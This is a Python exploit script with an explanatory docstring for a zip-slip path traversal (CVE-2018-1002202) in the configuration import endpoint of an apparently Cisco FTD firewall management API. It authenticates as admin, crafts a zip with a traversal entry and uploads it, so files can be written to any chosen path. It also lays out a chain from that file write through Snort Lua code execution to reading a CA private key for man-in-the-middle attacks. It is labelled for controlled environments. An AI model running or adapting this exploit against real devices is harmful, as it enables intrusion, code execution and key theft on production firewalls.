"""
F-FTD-67: FDM Config Import Zip-Slip via zip4j 1.3.3 (CVE-2018-1002202)
CONTROLLED ENVIRONMENT ONLY

Root cause:
  POST /api/fdm/v6/action/uploadconfigfile (authenticated admin, multipart .zip or .txt)
  → ConfigImportFileUploadResource.processUploadedFile()
  → ConfigFileDbImporter.importConfigFromFile()
  → extractTxtFileFromZipFile(srcZip, targetDir, password):
      ZipFileUtils.extractZipFile(srcZip, targetDir, password)
  → zip4j 1.3.3 ZipFile.extractAll(targetDir.getAbsolutePath())

  zip4j 1.3.3 (net.lingala.zip4j:zip4j:1.3.3) does NOT validate zip entry names
  for path traversal. ZipFileExtractor.extractAllFiles() calls extractOneFile()
  for each ZipEntry — the entry name (e.g., "../../../../../../tmp/evil.txt") is
  used directly to construct the output path: targetDir + "/" + entryName.

  CVE-2018-1002202: zip4j path traversal (no canonical path check on extraction).
  Fixed in zip4j 2.x. FTD 6.7.0-65 ships zip4j 1.3.3 — unpatched.

Zero additional gates:
  extractTxtFileFromZipFile() signature:
    ZipFileUtils.extractZipFile(srcZip, targetDir, password)  // line 3, that's it
  No filename filter, no canonical check, no whitelist. Zip entries go directly to disk.

Attack path:
  1. Admin credentials on FDM (F-FTD-60 pre-auth takeover, or F-FTD-64 null-name bypass)
  2. Craft malicious .zip with traversal entry:
       "../../../../../../<target-path>/evil.txt" → absolute write to any path www can write
  3. POST /api/fdm/v6/action/uploadconfigfile with the zip
  4. zip4j extracts traversal entry → file written outside expected config import dir
  5. www-writable paths: cron dirs (if any), web app directories, /tmp, /var/cisco/...

Target paths as www user:
  - /tmp/                             (always writable)
  - /ngfw/var/cisco/ngfwWebUi/...    (FDM web app root — overwrite JSP/assets)
  - /var/sf/detection_engines/.../custom/lua/  (F-FTD-63 chain: Snort LuaJIT exec)
  - /etc/cron.d/                      (check if www-writable on FTD)
  - /ngfw/var/cisco/deploy/           (deploy pipeline injection)

Compared to F-FTD-66 (SRU zip-slip):
  F-FTD-66: tar-based, outer wrapper requires Cisco sig (or "Sourcefire" bypass)
  F-FTD-67: zip-based, NO signature requirement — any zip accepted, direct extraction
  F-FTD-67 is the cleaner vector: admin + zip → immediate file write

Affected: FTD 6.7.0-65 (zip4j 1.3.3 confirmed in WEB-INF/lib).
Auth required: YES — admin credentials.
"""

# CONTROLLED ENVIRONMENT ONLY

import zipfile
import os
import sys
import io
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FDM_API_BASE = "/api/fdm/v6"
TOKEN_PATH = f"{FDM_API_BASE}/fdm/token"
CONFIG_UPLOAD_PATH = f"{FDM_API_BASE}/action/uploadconfigfile"


def get_auth_token(host, username, password, port=443):
    """Obtain FDM OAuth token."""
    url = f"https://{host}:{port}{TOKEN_PATH}"
    body = {"grant_type": "password", "username": username, "password": password}
    r = requests.post(url, json=body, verify=False, timeout=15)
    if r.status_code == 200:
        token = r.json().get("access_token")
        print(f"[+] Authenticated as {username}")
        return token
    print(f"[-] Auth failed: {r.status_code} — {r.text[:100]}")
    return None


def create_zipslip_zip(target_path, payload_content, output_path=None):
    """
    Create a malicious zip with a path traversal entry.

    zip4j 1.3.3 ZipFile.extractAll(destDir) does NOT check canonical paths.
    Entry name like "../../../../../../<abs-path>" resolves outside destDir.

    The config import targetDir is ${configUploadFile.location} (likely
    /ngfw/var/cisco/ngfwWebUi/config-import/ or similar).
    Traversal depth: use 10 levels to be safe; extra traversals are no-ops at root.

    CONTROLLED ENVIRONMENT ONLY — target /tmp/ for controlled testing.
    """
    # Build traversal to absolute path
    # From /ngfw/var/cisco/ngfwWebUi/config-import/ to /tmp/ftd67-proof.txt:
    # ../../../../../../../../../../tmp/ftd67-proof.txt (10 levels + abs path)
    depth = 10
    traversal = '../' * depth + target_path.lstrip('/')
    entry_name = traversal

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(entry_name, payload_content)

    zip_bytes = buf.getvalue()
    print(f"[*] Malicious zip created: {len(zip_bytes)} bytes")
    print(f"    Entry name: {entry_name}")
    print(f"    Target path: {target_path}")

    if output_path:
        with open(output_path, 'wb') as f:
            f.write(zip_bytes)
        print(f"    Saved to: {output_path}")

    return zip_bytes


def verify_local_zip_traversal(zip_path, extract_dir="/tmp/ftd67-test-extract"):
    """
    Verify the zip entry traversal behavior locally using Python's zipfile module.
    Python zipfile has the same issue — demonstrates the attack structure.
    Note: Python 3.12+ raises BadZipFile on traversal — use Python <3.12 or jar-based test.
    CONTROLLED ENVIRONMENT ONLY
    """
    print(f"\n[*] Local traversal verification (Python zipfile)")
    print(f"    NOTE: Python 3.12+ blocks traversal — use older Python or jar-based test")

    os.makedirs(extract_dir, exist_ok=True)

    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for entry in zf.infolist():
                print(f"    Entry name: {entry.filename}")
                # Simulate java: new File(destDir, entryName).getAbsolutePath()
                import posixpath
                resolved = posixpath.normpath(os.path.join(extract_dir, entry.filename))
                print(f"    java File(destDir, name) → {resolved}")
                if not resolved.startswith(extract_dir):
                    print(f"    [!] TRAVERSAL CONFIRMED: resolved path escapes destDir")
                    print(f"        destDir:  {extract_dir}")
                    print(f"        resolved: {resolved}")
                else:
                    print(f"    [-] Path stays within destDir (Python normalized it)")
    except Exception as e:
        print(f"    [-] Error: {e}")


def upload_config_zip(host, token, zip_bytes, filename="config-import.zip", port=443):
    """
    Upload malicious zip to POST /action/uploadconfigfile.
    On FDM 6.7.0-65, zip4j 1.3.3 extracts without path sanitization.
    CONTROLLED ENVIRONMENT ONLY
    """
    url = f"https://{host}:{port}{CONFIG_UPLOAD_PATH}"
    headers = {"Authorization": f"Bearer {token}"}

    print(f"\n[*] Uploading config zip to {url}")
    print(f"    Filename: {filename}")
    print(f"    Size: {len(zip_bytes)} bytes")

    files = {"fileToUpload": (filename, io.BytesIO(zip_bytes), "application/zip")}
    try:
        r = requests.post(url, headers=headers, files=files, verify=False, timeout=60)
        print(f"[*] Response: {r.status_code}")
        print(f"    Body: {r.text[:500]}")

        if r.status_code in (200, 201, 202):
            print(f"[!] Upload accepted — check target path for extracted file")
        elif r.status_code == 400:
            print(f"[-] 400 — validator rejected (check file format requirements)")
        elif r.status_code == 401:
            print(f"[-] 401 — auth token expired")
        return r.status_code

    except Exception as e:
        print(f"[-] Upload error: {e}")
        return None


if __name__ == '__main__':
    print("=" * 70)
    print("F-FTD-67: FDM Config Import Zip-Slip via zip4j 1.3.3 (CVE-2018-1002202)")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print(f"""
Path: POST /api/fdm/v6/action/uploadconfigfile (authenticated admin, .zip or .txt)
Chain: ConfigImportFileUploadResource → ConfigFileDbImporter.extractTxtFileFromZipFile()
       → ZipFileUtils.extractZipFile() → zip4j 1.3.3 extractAll() → path traversal

Key: zip4j 1.3.3 (WEB-INF/lib/zip4j-1.3.3.jar) does NOT sanitize zip entry names.
     CVE-2018-1002202 — fixed in zip4j 2.x, not backported.
     Zero additional gates in FDM config import path.

vs F-FTD-66 (SRU zip-slip):
  F-FTD-67 requires NO Cisco signature — any zip works.
  Cleaner vector: admin credentials → malicious zip → arbitrary file write as www.
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else 'demo'

    if mode == 'demo':
        print("--- Mode: create and verify zip traversal structure ---")
        target = "/tmp/ftd67-zipslip-proof.txt"
        payload = b"F-FTD-67: zip4j 1.3.3 zip-slip confirmed — CVE-2018-1002202\n"
        artifact = "/tmp/ftd67_malicious.zip"

        zip_bytes = create_zipslip_zip(target, payload, artifact)
        verify_local_zip_traversal(artifact)

        print(f"\n[*] To test on FTD in controlled lab:")
        print(f"    1. Get admin token (F-FTD-60 or F-FTD-64)")
        print(f"    2. Run: python3 {sys.argv[0]} upload <ftd-ip> admin <password>")
        print(f"    3. On FTD shell: ls -la /tmp/ftd67-zipslip-proof.txt")

    elif mode == 'upload':
        if len(sys.argv) < 4:
            print(f"Usage: {sys.argv[0]} upload <host> <password> [target_path]")
            sys.exit(1)
        host = sys.argv[2]
        password = sys.argv[3]
        target = sys.argv[4] if len(sys.argv) > 4 else "/tmp/ftd67-zipslip-proof.txt"

        token = get_auth_token(host, "admin", password)
        if not token:
            sys.exit(1)

        payload = b"F-FTD-67: zip4j 1.3.3 zip-slip via POST /action/uploadconfigfile\n"
        zip_bytes = create_zipslip_zip(target, payload)
        upload_config_zip(host, token, zip_bytes)

    elif mode == 'static':
        print("--- Static analysis summary ---")
        print(f"""
zip4j version: 1.3.3 (WEB-INF/lib/zip4j-1.3.3.jar)
CVE: CVE-2018-1002202
Fixed in: zip4j 2.x

Call graph (no path validation at any level):
  POST /api/fdm/v6/action/uploadconfigfile
    ConfigImportFileUploadResource.processUploadedFile()
      ConfigFileDbImporter.importConfigFromFile()
        if extension == "zip":
          extractTxtFileFromZipFile(srcZip, targetDir, null)
            ZipFileUtils.extractZipFile(srcZip, targetDir, null)    ← line 3, only line
              zip4j ZipFile.extractAll(targetDir.getAbsolutePath()) ← no path check
                // entry "../../../../../../tmp/evil.txt" → writes to /tmp/evil.txt

targetDir: ${configUploadFile.location} (runtime config — find in application-production.properties)

Attack chain:
  F-FTD-60 (pre-auth admin) → F-FTD-67 (arbitrary file write as www) →
  Write to /var/sf/detection_engines/<id>/custom/lua/evil.lua (F-FTD-63) →
  Snort policy push → sfsnort code exec →
  Read /etc/sf/ca_root/private/cakey.pem (F-FTD-61) → FMC comms MitM
""")

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
